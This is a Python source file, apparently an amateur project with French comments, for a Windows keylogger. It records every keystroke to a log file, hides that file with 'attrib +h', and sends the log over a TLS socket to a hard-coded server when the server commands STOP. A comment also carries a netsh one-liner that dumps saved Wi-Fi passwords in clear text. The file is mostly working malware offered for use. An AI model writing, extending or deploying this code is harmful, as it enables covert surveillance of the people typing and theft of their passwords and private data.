import socket
import ssl
import os
from pynput.keyboard import Key, Listener
import logging
import platform
import time

CA_CERTIFICATE = """
-----BEGIN CERTIFICATE-----
MIIFWzCCA0OgAwIBAgIUQ0Yz4rHQ9E4YZh5gptaR5VRKoZYwDQYJKoZIhvcNAQEL
BQAwPTELMAkGA1UEBhMCRlIxCzAJBgNVBAgMAjc4MSEwHwYDVQQKDBhJbnRlcm5l
dCBXaWRnaXRzIFB0eSBMdGQwHhcNMjQwMjA5MTg1OTM1WhcNMjUwMjA4MTg1OTM1
WjA9MQswCQYDVQQGEwJGUjELMAkGA1UECAwCNzgxITAfBgNVBAoMGEludGVybmV0
IFdpZGdpdHMgUHR5IEx0ZDCCAiIwDQYJKoZIhvcNAQEBBQADggIPADCCAgoCggIB
AJ6Kia9vXSAMfiFMvA2VLjiF+MoWy6TxuWY3crC6FlwX1b20SHl88IH8UgG82OW1
7LA1oW4eVKFqkxyIRHLqd6qFLvo990SVRHK2V2R4o0mH+Fsl4RzLz+7+h13mznuz
KGidLm7MROymYu/SEf45eCwTnOx97UJlMQx9UELSThTmz7fcW6Uv3NzvKRIvNpri
SzPYUb/0FVTc0kjAqOa76CHKwckz0CPp5VoxtyPjLYeqcCcjNyL/bTaltliE8xMS
gxLudwkiRqZmGJxlEvZukwsLB+tz0zgu6ynqUP64+K5l3bo6ix06WhTdTj+cV0tx
ikgPBQFNp3fmyFv9xtMEo19o3XTtpRQRgnVioH6PHiUNsdblPSHTE4LQCGnEFWnN
6U64iF1KZ4M89iNtw+CZuvBOrWphq4YX41BaaLrl/z1W9pkt30FNvepC9OhmGKIg
+peUOmPby5uS2tLzt4ao7rHp2285meGv5OF7Cvd0+aBHBkJAtn5oGCS/pUBLACO4
cKMbm4/mms034R+pHthaBsuGjkNfjZ+imXW9c1Ni8JgostRITq+/SjHy50Jp6cKA
upj07gq19Miuqhq8cDXqVdBijmBWi5oU+nrwhaZ5/MSCvXVPgE4kjn7JnhW5M6/q
J5qe5ofY/QVfrtUKeU1nWXJpl0Mpil2uCoRkrArNi59PAgMBAAGjUzBRMB0GA1Ud
DgQWBBRV7PSjMgbG4Wh09DjYfbTCdzRgvzAfBgNVHSMEGDAWgBRV7PSjMgbG4Wh0
9DjYfbTCdzRgvzAPBgNVHRMBAf8EBTADAQH/MA0GCSqGSIb3DQEBCwUAA4ICAQBX
px+EcbDV4yDfaF+GI+GxxcL3PXAEde2c+krHUkBGdu4ILEHNgRxl05kpfWSQuUYI
H0ImwTvPtdS0rgEvO7+hDUsmv2G0A7q+TDyrA/Rud0vN/Sc40CF87g7mnLwU3Y+9
NCSXoCX0e/Rs7LDe0FxllGs/nsKQMCmNHt8mXB/72JitId24vWuD2wwIEYrJtF5y
mwLfD2exqHAuWFvUHkeIF/kwL2tajds1+o8vnfthYg8TIq4uQCUhvkWq155tEXKv
ZooLdOgXodUTLjdrcCfX70TIbCq25Jo0cdcx/SanBnVg9sjiQpt17wS8TinfDBMj
RgeVZVrB8EIpZWPs73uQabL/FA8myYAygSb5r/TmNTeAB6MK/wyVktqEeMIErFXZ
FVC7iyRvcqGpjIO3S32eXWjRJdcEEskAWK+c2SVxcDObo/dVyOg1bXEiUUFuDU8H
cTr9m3szlFqjxhPb9nwnkr/+okvyDzvzK+MlVh1GR/aQiwAdCeZhsPyhWMfps4nu
uSbJ0vAnNYKu91uE2BhvvaTj13huFeFx82IRcXA7qLYKzczz9z8SZSNv5ctk1QEd
oPi65PEdtor6J9dDx/BPb/fsOsScN2nA4XWKPXdbo8dhyud3N5KVjgPcgQcFGlEk
RW7JvNRl0XUP70UYyoUhK0KpFX8BOfZXWFEQBAxmaQ==
-----END CERTIFICATE-----
"""

# for /f "skip=9 tokens=1,2 delims=:" %i in ('netsh wlan show profiles') do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear
def check_platform():
    return platform.system()

def find_ca_cert_path():
    for r, d, f in os.walk("c:\\"): 
        for files in f:
            if files == "ca-cert.pem":
                path = os.path.join(r, files)
                if path.endswith("SSL\\CA\\ca-cert.pem"):
                    return path  
    return None 
    
def os_check():
        current_platform = check_platform()
        if current_platform == 'Windows':
            #print('Windows')
            return 'Windows'
        elif current_platform == 'Linux':
            #print('Linux')
            return 'Linux'   
        else:
            return None

def send_file(conn, filename):
    with open(filename, 'rb') as f:
        while True:
            chunk = f.read(1024)  # Lire un chunk du fichier
            print(f"chunk {chunk}")
            if not chunk:
                break  # Si le chunk est vide, on a atteint la fin du fichier
            conn.sendall(chunk)  # Envoyer le chunk au client

def key_logger(path_hidden_file, client_ssl):
    logging.basicConfig(filename=path_hidden_file, level=logging.DEBUG, format="%(asctime)s - %(message)s")
    
    os.system(f"attrib +h {path_hidden_file}") #make the file hidden
    
    msg=client_ssl.recv(1024).decode()
    print(f"Server : {msg}")
    if msg == "STOP":
        print("stop")
        send_file(client_ssl, "its_a_trap.txt")

    def on_press(key):
        logging.info(str(key))
        
    
        
 
    # Crée un écouteur de clavier pour enregistrer les touches
    with Listener(on_press=on_press) as listener:
        listener.join()

def main():
    print('main active')
    os_local = os_check()
    print(os_local)
    if os_local == 'Windows':
        #print("Wait until the programme find the certificate file on your device ...")
        #ca_cert_path = find_ca_cert_path()
        #print(ca_cert_path)
        #script_dir = os.path.dirname(os.path.realpath(__file__))
        #ca_cert_path = os.path.abspath(os.path.join(script_dir, "..", "..","SSL", "CA", "ca-cert.pem"))
        # ca_cert_path = "C:/Users/rrais/Desktop/Dev/Python_Scripting/SSL/CA/ca-cert.pem" # take this path when you run it on .exe
        #print("CA cert path:", ca_cert_path)
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        context.load_verify_locations(cadata=CA_CERTIFICATE)

        # Setting
        host = '192.168.90.12' #remplacer par l'ip du serveur
        port = 90
        socket_obj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        # Secure the socket
        client_ssl = context.wrap_socket(socket_obj, server_hostname=host)
        client_ssl.connect((host, port))
    #bien ou quoi
        while True:
            try:
                key_logger("its_a_trap.txt", client_ssl)
 
                    
                    #exit(1)
                    #print("-- END --")
                    #client_ssl.close()
                
            except Exception as e:
                print(f"Error: {e}")
                break

        print("-- END --")
        client_ssl.close()
    else : 
        print("linux in maintenance")

if __name__ == "__main__":
    main()
